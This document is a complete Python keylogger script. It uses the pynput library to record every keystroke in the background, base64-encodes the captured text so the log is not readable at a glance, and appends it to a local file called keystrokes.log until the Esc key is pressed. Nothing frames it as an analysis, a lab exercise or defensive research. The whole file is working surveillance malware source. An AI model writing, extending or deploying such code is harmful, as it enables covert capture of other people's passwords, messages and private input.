import base64
from pynput import keyboard

# File to save the logged keystrokes
LOG_FILE = 'keystrokes.log'

# Buffer to accumulate keystrokes
keystroke_buffer = []

def encode_data(data):
    """Encode the data using base64 encoding."""
    return base64.b64encode(data.encode()).decode()

def write_to_file(data):
    """Write the encoded data to the log file."""
    with open(LOG_FILE, 'a') as file:
        file.write(data + '\n')

def on_press(key):
    """Callback function for key press events."""
    try:
        # Convert key to string and append to buffer
        keystroke_buffer.append(key.char)
    except AttributeError:
        # Handle special keys
        keystroke_buffer.append(f'[{key}]')

def on_release(key):
    """Callback function for key release events."""
    if key == keyboard.Key.esc:
        # End the logging if 'esc' is pressed
        print("Logging stopped.")
        save_buffer()
        return False  # Stop listener

def save_buffer():
    """Save the accumulated keystrokes to the file."""
    if keystroke_buffer:
        data = ''.join(keystroke_buffer)
        encoded_data = encode_data(data)
        write_to_file(encoded_data)
        keystroke_buffer.clear()

# Setup the listener for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
